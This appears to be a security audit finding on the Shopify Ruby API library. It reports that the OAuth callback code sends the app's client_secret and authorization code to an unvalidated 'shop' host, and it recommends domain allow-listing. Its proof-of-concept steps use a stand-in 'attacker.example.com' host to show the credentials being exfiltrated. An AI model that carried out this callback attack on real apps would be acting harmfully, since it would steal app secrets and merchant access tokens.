### Title
Missing `shop` domain validation lets a maliciously-crafted OAuth callback exfiltrate `client_secret`/authorization `code` to an attacker-controlled host (SSRF with app credentials) - ([File: lib/shopify_api/auth/oauth.rb](https://github.com/Alyssadaypin/shopify-api-ruby--016))

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` verifies the callback query's HMAC, but never validates that the `shop` value in that query is an actual `*.myshopify.com` (or otherwise Shopify-owned) domain before using it to build the destination URL for the access-token exchange request, which carries the app's `client_secret`.

### Finding Description
`validate_auth_callback` verifies `Utils::HmacValidator.validate(auth_query)` and `state == auth_query.state`, then immediately trusts `auth_query.shop` as a destination host: [1](#0-0) 

The HMAC only proves the query parameters (`code`, `host`, `shop`, `state`, `timestamp`) were signed together with the app's own `api_secret_key` — it says nothing about whether `shop` is a legitimate Shopify store domain: [2](#0-1) 

That unsanitized `shop` is put directly into a `Session`, which is then used to build the HTTP client's base URI: [3](#0-2) [4](#0-3) 

`begin_auth`'s own `auth_base_uri(shop)` helper has the identical gap — it constructs `https://#{shop}/admin` with no allow-listing of the Shopify domain suffix: [5](#0-4) 

Nowhere in `lib/shopify_api/**` is `shop` checked against a `*.myshopify.com` (or configured dev-domain) pattern; a grep for such validation (`myshopify`, `shop_regex`, `valid_shop`, etc.) returns no hits outside of REST fixture tests.

The identity binding that is broken is:
`bytes covered by HMAC (shop, code, host, state, timestamp)` ≠ `host that receives client_id/client_secret/code during the access-token POST`.
The HMAC guarantees integrity of the parameter set as issued by Shopify's OAuth backend, but the library never re-derives or restricts the *host* it subsequently sends credentials to from a value it independently trusts (e.g., a configured shop-domain suffix); it simply reuses the attacker/merchant-influenced `shop` string.

### Impact Explanation
If an OAuth authorization/install flow can be driven with a `shop` value that is not itself a `*.myshopify.com` domain (e.g. via a custom/dev-store domain, subdomain confusion, or any Shopify surface that will still countersign the callback with the app's secret for a non-standard `shop` value), `validate_auth_callback` will POST `client_id`, `client_secret`, and the one-time-use authorization `code` to that attacker-controlled host. This directly satisfies the High-impact category: "SSRF with the app's credentials" — exposing the `client_secret` (and a valid `code` redeemable for a merchant access token) to a third party.

### Likelihood Explanation
Exploitation requires the ability to have the callback's `shop`/`host` fields carry an untrusted value while the HMAC still validates — this depends on external conditions (e.g., store/plan-specific custom domains, or Shopify surfaces that route through non-`myshopify.com` hosts) rather than any secret-holder cooperation, keeping it within the "unprivileged internet user" threat model. It is not certain, but the code path performs zero defense-in-depth check on the value it will trust as a network destination for credentials, which is why this is flagged.

### Recommendation
- In `ShopifyAPI::Auth::Oauth.validate_auth_callback` and `begin_auth`/`auth_base_uri`, validate `shop` against an explicit allow-list pattern (e.g., `\A[a-zA-Z0-9][a-zA-Z0-9-]*\.myshopify\.com\z`, plus any explicitly configured dev/spin domains) before using it to construct any outbound request URI.
- Reject the callback (raise `Errors::InvalidOauthError`) if `shop` fails this validation, independent of HMAC success.

### Proof of Concept
1. An app is registered with `api_secret_key` `S`.
2. Attacker obtains (via a Shopify install/authorize flow that signs `shop=attacker.example.com` together with a valid `code`, `state`, `host`, `timestamp` using `S` — e.g. a custom/dev-store domain scenario) a callback URL:
   `GET /auth/callback?shop=attacker.example.com&code=...&state=...&host=...&timestamp=...&hmac=<valid-for-S>`
3. Victim/merchant browser (or attacker directly) hits the app's callback endpoint with these parameters.
4. `ShopifyAPI::Auth::Oauth.validate_auth_callback` passes HMAC and state checks (both computed over `shop=attacker.example.com`).
5. The library issues `POST https://attacker.example.com/admin/oauth/access_token` with body `{client_id, client_secret: S-associated-secret, code, expiring}`.
6. Attacker's server logs the `client_secret` and `code`, then can redeem `code` against the real Shopify API using the exfiltrated secret to obtain a merchant access token.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
